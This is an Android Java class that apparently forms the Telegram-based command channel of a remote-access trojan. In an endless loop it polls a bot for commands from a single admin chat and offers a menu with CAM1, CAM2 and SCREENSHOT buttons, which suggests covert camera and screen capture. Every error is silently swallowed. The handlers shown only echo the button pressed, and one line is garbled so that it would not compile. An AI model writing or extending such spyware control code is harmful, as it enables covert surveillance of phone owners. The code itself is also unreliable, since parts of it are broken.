package com.chimera;

import android.content.Context;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class TelegramBotWorker implements Runnable {
    private Context context;
    private long lastUpdateId = 0;
    private int interval = 5000;

    public TelegramBotWorker(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    @Override
    public void run() {
        while (true) {
            try {
                poll();
            } catch (Exception e) {}
            try {
                Thread.sleep(interval);
            } catch (Exception e) {}
        }
    }

    private void poll() {
        try {
            String token = ConfigLoader.getBotToken();
            long admin = ConfigLoader.getAdminId();
            if (token == null || admin == 0) return;
            String urlStr = "https://api.telegram.org/bot" + token + "/getUpdates?timeout=5";
            if (lastUpdateId > 0) {
                urlStr += "&offset=" + (lastUpdateId + 1);
            }
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            InputStream is = conn.getInputStream();
            byte[] buffer = new byte[8192];
            int len = is.read(buffer);
            String resp = new String(buffer, 0, len);
            is.close();
            conn.disconnect();
            JSONObject obj = new JSONObject(resp);
            if (!obj.getBoolean("ok")) return;
            JSONArray arr = obj.getJSONArray("result");
            for (int i = 0; i < arr.length(); i++) {
                JSONObject upd = arr.getJSONObject(i);
                if (upd.has("update_id")) {
                    lastUpdateId = upd.getLong("update_id");
                }
                if (upd.has("message")) {
                    JSONObject msg = upd.getJSONObject("message");
                    if (msg.getLong("chat").get("id") == admin) {
                        handleMessage(msg);
                    }
                } else if (upd.has("callback_query")) {
                    JSONObject cb = upd.getJSONObject("callback_query");
                    if (cb.getJSONObject("message").getJSONObject("chat").getLong("id") == admin) {
                        handleCallback(cb);
                    }
                }
            }
        } catch (Exception e) {}
    }

    private void handleMessage(JSONObject msg) {
        try {
            String text = msg.getString("text");
            long chatId = msg.getJSONObject("chat").getLong("id");
            if (text.equalsIgnoreCase("/command")) {
                sendMenu(chatId);
            }
        } catch (Exception e) {}
    }

    private void sendMenu(long chatId) {
        try {
            String token = ConfigLoader.getBotToken();
            String urlStr = "https://api.telegram.org/bot" + token + "/sendMessage";
            String body = "{\"chat_id\":" + chatId + ",\"text\":\"Choose Command\",\"reply_markup\":{\"inline_keyboard\":[[{\"text\":\"CAM1\",\"callback_data\":\"CAM1\"},{\"text\":\"CAM2\",\"callback_data\":\"CAM2\"}], [{\"text\":\"SCREENSHOT\",\"callback_data\":\"SCREENSHOT\"}] ]}}";
            post(urlStr, body);
        } catch (Exception e) {}
    }

    private void handleCallback(JSONObject cb) {
        try {
            String data = cb.getString("data");
            String token = ConfigLoader.getBotToken();
            long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");
            String urlStr = "https://api.telegram.org/bot" + token + "/sendMessage";
            String msg = "Clicked: " + data;
            String body = "{\"chat_id\":" + chatId + ",\"text\":\"" + msg + "\"}";
            post(urlStr, body);
        } catch (Exception e) {}
    }

    private void post(String urlStr, String jsonBody) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            conn.setRequestProperty("Content-Type", "application/json");
            OutputStream os = conn.getOutputStream();
            os.write(jsonBody.getBytes("UTF-8"));
            os.flush();
            os.close();
            conn.getInputStream().close();
            conn.disconnect();
        } catch (Exception e) {}
    }
}